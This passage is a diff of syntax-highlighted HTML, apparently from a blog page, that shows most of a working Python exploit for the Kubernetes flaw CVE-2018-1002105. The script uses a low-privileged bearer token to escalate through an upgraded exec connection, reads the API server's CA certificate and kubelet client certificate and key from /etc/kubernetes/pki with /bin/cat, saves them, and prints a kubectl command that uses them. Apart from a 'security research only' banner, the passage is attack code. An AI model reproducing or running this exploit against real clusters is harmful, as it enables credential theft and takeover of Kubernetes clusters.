-                <span class="n">fail_message</span><span class="o">=</span><span class="s1">&#39;[-] Not vulnerable to CVE-2018-1002105.&#39;</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Vulnerable to CVE-2018-1002105, continue.&#34;</span><span class="p">)</span>
-
-            <span class="c1"># step 2</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Getting running pods list...&#34;</span><span class="p">)</span>
-            <span class="n">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="s1">&#39;/runningpods/&#39;</span><span class="p">)</span>
-            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
-            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 200 OK&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Got running pods list.&#34;</span><span class="p">)</span>
-
-            <span class="n">pods_info</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">_get_http_body</span><span class="p">(</span><span class="n">resp</span><span class="p">))</span>
-            <span class="n">pods_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">pod</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_info</span><span class="p">[</span><span class="s1">&#39;items&#39;</span><span class="p">]]</span>
-            <span class="k">for</span> <span class="n">pod</span> <span class="ow">in</span> <span class="n">pods_list</span><span class="p">:</span>
-                <span class="k">if</span> <span class="n">pod</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;kube-apiserver&#39;</span><span class="p">):</span>
-                    <span class="n">api_server</span> <span class="o">=</span> <span class="n">pod</span>
-                    <span class="k">break</span>
-            <span class="k">else</span><span class="p">:</span>
-                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Cannot find API Server.&#34;</span><span class="p">)</span>
-                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] API Server is </span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s2">.&#34;</span><span class="p">)</span>
-
-            <span class="c1"># step 3</span>
-            <span class="n">_steal_secret</span><span class="p">(</span>
-                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
-                <span class="n">secret_file</span><span class="o">=</span><span class="n">ca_crt</span><span class="p">,</span>
-                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
-            <span class="n">_steal_secret</span><span class="p">(</span>
-                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
-                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_crt</span><span class="p">,</span>
-                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN CERTIFICATE&#39;</span><span class="p">)</span>
-            <span class="n">_steal_secret</span><span class="p">(</span>
-                <span class="n">api_server</span><span class="o">=</span><span class="n">api_server</span><span class="p">,</span>
-                <span class="n">secret_file</span><span class="o">=</span><span class="n">client_key</span><span class="p">,</span>
-                <span class="n">match_banner</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;BEGIN RSA PRIVATE KEY&#39;</span><span class="p">)</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Enjoy your trip :)&#39;</span><span class="p">)</span>
-    <span class="n">cmd_try</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;kubectl --server=https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span> \
-              <span class="sa">f</span><span class="s2">&#34; --certificate-authority=</span><span class="si">{</span><span class="n">ca_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
-              <span class="sa">f</span><span class="s2">&#34; --client-certificate=</span><span class="si">{</span><span class="n">client_crt</span><span class="si">}</span><span class="s2">&#34;</span> \
-              <span class="sa">f</span><span class="s2">&#34; --client-key=</span><span class="si">{</span><span class="n">client_key</span><span class="si">}</span><span class="s2"> get pods -n kube-system&#34;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">cmd_try</span><span class="p">)</span>
-
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">main</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;ExP for CVE-2018-1002105
+</span></span></span><span class="line"><span class="cl"><span class="s2">ONLY USED FOR SECURITY RESEARCH
+</span></span></span><span class="line"><span class="cl"><span class="s2">ILLEGAL USE IS **PROHIBITED**
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">base64</span><span class="p">,</span> <span class="n">token_bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ssl</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">http_parser.parser</span> <span class="kn">import</span> <span class="n">HttpParser</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">http_parser.pyparser</span> <span class="kn">import</span> <span class="n">HttpParser</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">Purpose</span><span class="o">.</span><span class="n">CLIENT_AUTH</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Args</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;ExP for CVE-2018-1002105.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_argument_group</span><span class="p">(</span><span class="s1">&#39;required arguments&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s IP&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s port&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--bearer-token&#39;</span><span class="p">,</span> <span class="s1">&#39;-b&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Bearer token for the low privileged user&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--namespace&#39;</span><span class="p">,</span> <span class="s1">&#39;-n&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;namespace&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Namespace with method access&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">default</span><span class="o">=</span><span class="s1">&#39;default&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--pod&#39;</span><span class="p">,</span> <span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;pod&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Pod with method access&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># HTTP Gadgets</span>
+</span></span><span class="line"><span class="cl"><span class="n">http_delimiter</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">host_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Host: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Authorization: Bearer </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn_header</span> <span class="o">=</span> <span class="s1">&#39;Connection: upgrade&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">upgrade_header</span> <span class="o">=</span> <span class="s1">&#39;Upgrade: websocket&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">agent_header</span> <span class="o">=</span> <span class="s1">&#39;User-Agent: curl/7.64.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">accept_header</span> <span class="o">=</span> <span class="s1">&#39;Accept: */*&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">origin_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Origin: http://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sec_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">token_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sec_websocket_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Sec-WebSocket-Key: </span><span class="si">{</span><span class="n">sec_key</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sec_websocket_version</span> <span class="o">=</span> <span class="s1">&#39;Sec-WebSocket-Version: 13&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># secret targets</span>
+</span></span><span class="line"><span class="cl"><span class="n">ca_crt</span> <span class="o">=</span> <span class="s1">&#39;ca.crt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">client_crt</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.crt&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">client_key</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.key&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_http_body</span><span class="p">(</span><span class="n">byte_http</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">HttpParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recved</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_http</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">byte_http</span><span class="p">,</span> <span class="n">recved</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv_body</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">4096</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">incoming</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">incoming</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">+=</span> <span class="n">ssock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload1</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET /api/v1/namespaces/</span><span class="si">{</span><span class="n">namespace</span><span class="si">}</span><span class="s1">/pods/</span><span class="si">{</span><span class="n">pod</span><span class="si">}</span><span class="s1">/exec HTTP/1.1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">host_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">auth_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">upgrade_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">conn_header</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload1</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_run_with_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">get_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">http_delimiter</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;GET </span><span class="si">{</span><span class="n">get_path</span><span class="si">}</span><span class="s1"> HTTP/1.1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">host_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">auth_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">conn_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">upgrade_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">origin_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">sec_websocket_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="n">sec_websocket_version</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">http_delimiter</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_match_or_exit</span><span class="p">(</span><span class="n">banner_bytes</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="s2">&#34;[-] Failed.&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">banner_bytes</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">fail_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delimiter</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;-----&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">rindex</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">delimiter</span><span class="p">)]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_save_file</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_steal_secret</span><span class="p">(</span><span class="n">api_server</span><span class="p">,</span> <span class="n">secret_file</span><span class="p">,</span> <span class="n">match_banner</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Creating new privileged pipe...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stdin, stdout, stderr&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Trying to steal </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cmd1</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cmd2</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/etc/kubernetes/pki/</span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_run_with_privilege</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ssock</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s1">&#39;/exec/kube-system/</span><span class="si">{</span><span class="n">api_server</span><span class="si">}</span><span class="s1">/kube-apiserver?command=</span><span class="si">{</span><span class="n">cmd1</span><span class="si">}</span><span class="s1">&amp;command=</span><span class="si">{</span><span class="n">cmd2</span><span class="si">}</span><span class="s1">&amp;input=1&amp;output=1&amp;tty=0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_match_or_exit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;HTTP/1.1 101 Switching Protocols&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_match_or_exit</span><span class="p">(</span><span class="n">match_banner</span><span class="p">,</span> <span class="n">resp</span><span class="p">,</span> <span class="n">fail_message</span><span class="o">=</span><span class="sa">f</span><span class="s1">&#39;[-] Cannot find banner </span><span class="si">{</span><span class="n">match_banner</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Got </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1">.&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">secret_content</span> <span class="o">=</span> <span class="n">_get_secret</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_save_file</span><span class="p">(</span><span class="n">secret_file</span><span class="p">,</span> <span class="n">secret_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[+] Secret </span><span class="si">{</span><span class="n">secret_file</span><span class="si">}</span><span class="s1"> saved :)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Exploiting CVE-2018-1002105...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">)))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">)</span> <span class="k">as</span> <span class="n">ssock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># step 1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ssock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Checking vulnerable or not...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_try_to_get_privilege</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">namespace</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">namespace</span><span class="p">,</span> <span class="n">pod</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">pod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">)</span>
